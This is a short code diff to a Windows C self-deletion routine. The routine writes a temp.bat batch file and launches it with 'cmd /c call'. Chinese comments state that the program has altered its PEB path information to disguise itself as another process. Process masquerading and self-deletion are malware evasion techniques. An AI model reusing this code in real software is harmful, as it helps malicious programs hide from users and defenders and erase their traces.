@@ -34,7 +34,6 @@ BOOL CreatePingBat(char* pszBatFileName)
 BOOL DelSelf()
 {
 	BOOL bRet = FALSE;
-	char szCurrentDirectory[MAX_PATH] = { 0 };
 	char szBatFileName[MAX_PATH] = { 0 };
 	char szCmd[MAX_PATH] = { 0 };
 
@@ -42,12 +41,11 @@ BOOL DelSelf()
 	// 由于我们已经修改了PEB中的路径信息以达到进程伪装的目的
 	// 所以这里不能使用GetModuleFileName获取本程序路径信息
 	
-	::GetModuleFileName(NULL, szCurrentDirectory, MAX_PATH);
-	char* p = strrchr(szCurrentDirectory, '\\');
+	char* p = strrchr(g_szCurrentDirectory, '\\');
 	p[0] = '\0';
 	// 构造批处理文件路径
 	::StringCchPrintfA(szBatFileName, sizeof(szBatFileName), 
-		"%s\\temp.bat", szCurrentDirectory);
+		"%s\\temp.bat", g_szCurrentDirectory);
 	// 构造调用执行批处理的 CMD 命令行
 	::StringCchPrintfA(szCmd, sizeof(szCmd), "cmd /c call \"%s\"", szBatFileName);
 
